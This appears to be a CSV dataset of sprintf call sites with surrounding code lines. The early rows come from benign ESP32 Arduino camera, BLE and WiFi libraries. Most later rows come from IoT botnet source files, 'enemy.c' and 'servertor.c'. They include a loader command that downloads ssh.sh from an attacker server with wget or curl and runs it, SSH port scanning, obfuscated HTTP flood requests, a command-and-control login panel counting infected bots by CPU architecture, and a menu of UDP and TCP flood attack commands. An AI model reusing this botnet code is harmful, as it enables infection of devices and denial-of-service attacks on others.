2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);",120,1,"    p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);
    p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);
    p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);
    p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);
    p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);",120,1,"    p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);
    p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);
    p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);
    p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);
    p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);",120,1,"    p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);
    p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);
    p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);
    p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);
    p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);",120,1,"    p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);
    p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);
    p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);
    p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);
    p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);",120,1,"    p+=sprintf(p, ""\""hmirror\"":%u,"", s->status.hmirror);
    p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);
    p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);
    p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);
    p+=sprintf(p, ""\""face_enroll\"":%u,"", is_enrolling);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);",120,1,"    p+=sprintf(p, ""\""dcw\"":%u,"", s->status.dcw);
    p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);
    p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);
    p+=sprintf(p, ""\""face_enroll\"":%u,"", is_enrolling);
    p+=sprintf(p, ""\""face_recognize\"":%u"", recognition_enabled);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""face_enroll\"":%u,"", is_enrolling);",120,1,"    p+=sprintf(p, ""\""colorbar\"":%u,"", s->status.colorbar);
    p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);
    p+=sprintf(p, ""\""face_enroll\"":%u,"", is_enrolling);
    p+=sprintf(p, ""\""face_recognize\"":%u"", recognition_enabled);
    *p++ = '}';
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""face_recognize\"":%u"", recognition_enabled);",120,1,"    p+=sprintf(p, ""\""face_detect\"":%u,"", detection_enabled);
    p+=sprintf(p, ""\""face_enroll\"":%u,"", is_enrolling);
    p+=sprintf(p, ""\""face_recognize\"":%u"", recognition_enabled);
    *p++ = '}';
    *p++ = 0;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEUtils.cpp,"sprintf((char*) target, ""%.2x"", (char) *source);",120,1,"
	for (int i = 0; i < length; i++) {
		sprintf((char*) target, ""%.2x"", (char) *source);
		source++;
		target += 2;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,"sprintf(str, ""%02x:%02x:%02x:%02x:%02x:%02x"",",120,1,"
  uint8_t *p = bda;
  sprintf(str, ""%02x:%02x:%02x:%02x:%02x:%02x"",
          p[0], p[1], p[2], p[3], p[4], p[5]);
  return str;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""%.2x "", pData[index]);",120,1,"	uint32_t index = 0;
	while (index < length) {
		sprintf(tempBuf, ""%.2x "", pData[index]);
		strcat(hex, tempBuf);
		if (isprint(pData[index])) {
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""%c"", pData[index]);",120,1,"		strcat(hex, tempBuf);
		if (isprint(pData[index])) {
			sprintf(tempBuf, ""%c"", pData[index]);
		} else {
			sprintf(tempBuf, ""."");
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\GeneralUtils.cpp,"sprintf(tempBuf, ""."");",120,1,"			sprintf(tempBuf, ""%c"", pData[index]);
		} else {
			sprintf(tempBuf, ""."");
		}
		strcat(ascii, tempBuf);
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\ETH.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\ETH.cpp,"sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);",120,1,"    char macStr[18] = { 0 };
    esp_eth_get_mac(mac);
    sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiScan.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiScan.cpp,"sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", it->bssid[0], it->bssid[1], it->bssid[2], it->bssid[3], it->bssid[4], it->bssid[5]);",120,1,"        return String();
    }
    sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", it->bssid[0], it->bssid[1], it->bssid[2], it->bssid[3], it->bssid[4], it->bssid[5]);
    return String(mac);
}
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,"sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);",120,1,"    }
    char mac[18] = { 0 };
    sprintf(mac, ""%02X:%02X:%02X:%02X:%02X:%02X"", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(mac);
}
"
2021\embed-iot-core\examples\mqtt\pressure_measurer\pressure_measurer.cpp,Dataset Download,../../Dataset Download/2021\embed-iot-core\examples\mqtt\pressure_measurer\pressure_measurer.cpp,"sprintf(ipArray, ""%d.%d.%d.%d"",",120,1,"    static char ipArray[26];
    IPAddress ipNumber = WiFi.localIP();
    sprintf(ipArray, ""%d.%d.%d.%d"", 
        ipNumber[0], ipNumber[1], ipNumber[2], ipNumber[3]);
    return ipArray;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(request, ""%s %s %s/%s\r\n%s: %s\r\n%s-%s: %s\r\n\r\n"", method, path, decode(""ecc|""), decode(""quq""), decode(""DBwwtr!3Bw""), connections[(rand() % 3)], decode(""1;t=""), decode(""74tw!""), useragents[rand() % NUMITEMS(useragents)]);",120,1,"    int i, timeEnd = time(NULL) + timeFoo;
    char request[2048];
    sprintf(request, ""%s %s %s/%s\r\n%s: %s\r\n%s-%s: %s\r\n\r\n"", method, path, decode(""ecc|""), decode(""quq""), decode(""DBwwtr!3Bw""), connections[(rand() % 3)], decode(""1;t=""), decode(""74tw!""), useragents[rand() % NUMITEMS(useragents)]);
    for (i = 0; i < power; i++) {
        if (fork()) {
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);",120,1,"			}
            memset(rhexstring, 0, 128);
			sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);
			send(std_hex, rhexstring, strlen(rhexstring), 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(tmp, ""%02x"", p[i]);",120,1,"  memset(output, 0, sizeof(output));
  for (i=0;i<strlen(p);i++) {
    sprintf(tmp, ""%02x"", p[i]);
    strcat(output, tmp);
  }
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);",120,1,"                        
						util_zero(ip, sizeof(ip));
						sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));",120,1,"						sprintf(ip, ""%d.%d.%d.%d"", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        close(conn->fd);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(rekdevice, ""cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http:",120,1,"    char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, ""cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http://%s/ssh.sh -O ssh.sh || busybox wget http://%s/ssh.sh -O ssh.sh || curl http://%s/ssh.sh -O ssh.sh || busybox curl http://%s/ssh.sh -O ssh.sh; chmod 777 ssh.sh; ./ssh.sh; rm -f ssh.sh &\r\n"", ldserver, ldserver, ldserver, ldserver);
   // printf(""%s"", rekdevice);
    int bufsize = strlen(rekdevice);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(fds[k].ip, ""%s"", inet_ntoa(address.sin_addr));",120,1,"                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
                            sprintf(fds[k].ip, ""%s"", inet_ntoa(address.sin_addr));
                            address.sin_port = HTONS(22);
                            fds[k].sock = socket(AF_INET, SOCK_STREAM, 0);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(str, ""/etc/%s"", decode(""=ru_Brf_""));",120,1,"			FILE *file;
			char str[16];
            sprintf(str, ""/etc/%s"", decode(""=ru_Brf_""));
			file=fopen(str,""r"");
			if (file == NULL) {
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"sprintf(outfile,""%s%s\n"",cwd,argv[0]+i);",120,1,"					if (strcmp(cwd,""/"")) {
							while(argv[0][i] != '/') i--;
							sprintf(outfile,""%s%s\n"",cwd,argv[0]+i);
							while(!feof(file)) {
									fgets(buf,1024,file);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(string, ""%c]0;Devices: %d | Users Online: %d%c"", '\033', BotsConnected(), OperatorsConnected, '\007');",120,1,"    while(1) {
		memset(string, 0, 2048);
        sprintf(string, ""%c]0;Devices: %d | Users Online: %d%c"", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\e[31mUsername\e[97m: "");",120,1,"	}

        sprintf(botnet, ""\e[31mUsername\e[97m: "");
		if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\e[31mPassword\e[97m: \e[30m"");",120,1,"		snprintf(managements[datafd].userprompt, sizeof(managements[datafd].userprompt), ""\e[31m%s:\e[31m"", managements[datafd].username);
		memset(buf, 0, sizeof(buf));
        sprintf(botnet, ""\e[31mPassword\e[97m: \e[30m"");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(failed_line1, ""\e[105m            Invalid Login!        \r\n"");",120,1,"		char failed_line1[80];
		
		sprintf(failed_line1, ""\e[105m            Invalid Login!        \r\n"");
		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected);",120,1,"		memset(banner_bot_count, 0, 2048);
		
		sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);

"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);",120,1,"		
		sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	""\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n"", accounts[find_line].username);

		if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36musers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);",120,1,"	            if(BotsConnected() == 0)
	            {
	                sprintf(botnet, ""\x1b[1;36musers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	            }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mUsers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);",120,1,"	            else
	            {
	                sprintf(botnet, ""\x1b[1;36mUsers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                if(ppc != 0)
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mpowerpc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", ppc);",120,1,"	                if(ppc != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mpowerpc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", ppc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36msh4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sh4);",120,1,"	                if(sh4 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36msh4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sh4);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mx86 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", x86);",120,1,"	                if(x86 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mx86 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", x86);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm3 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv3);",120,1,"	                if(armv3 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm3 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv3);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm4t [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv4t);",120,1,"	                if(armv4t != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm4t [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv4t);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm6 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv6);",120,1,"	                if(armv6 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm6 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv6);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36marm7 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv7);",120,1,"	                if(armv7 != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36marm7 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", armv7);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mmips [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mips);",120,1,"	                if(mips != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mmips [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mips);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mm68k [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", m68k);",120,1,"	                if(m68k != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mm68k [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", m68k);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36msparc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sparc);",120,1,"	                if(sparc != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36msparc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", sparc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mmipsel [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mipsel);",120,1,"	                if(mipsel != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36mmipsel [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", mipsel);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36munknown [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", unknown);",120,1,"	                if(unknown != 0)
	                {
	                    sprintf(botnet, ""\x1b[1;36munknown [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", unknown);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(botnet, ""\x1b[1;36mTotal: [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", BotsConnected());",120,1,"	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                sprintf(botnet, ""\x1b[1;36mTotal: [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m"", BotsConnected());
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(statuscount, ""TELNET DEVICES: %d  TELNET STATUS: %d\r\n"", TELFound, scannerreport);",120,1,"			}
			else if(strstr(buf, ""stat"")){
				sprintf(statuscount, ""TELNET DEVICES: %d  TELNET STATUS: %d\r\n"", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
			}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");",120,1,"				char ddosline11 [150];
				char ddosline12 [150];
				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");",120,1,"				char ddosline12 [150];
				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline1, ""\e[37m  ╔════════════════════════════════════════════════════════════════════════════════════╗\e[37m\r\n"");
				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline2, ""\e[37m  ║  [!] Attack Commands                                                               ║\r\n"");
				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");",120,1,"				sprintf(ddosline3, ""\e[37m  ║  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");",120,1,"				sprintf(ddosline4, ""\e[37m  ║  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline5, ""\e[37m  ║  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] ║\r\n"");
				sprintf(ddosline6, ""\e[37m  ║  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         ║\r\n"");
				sprintf(ddosline7, ""\e[37m  ║  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         ║\r\n"");
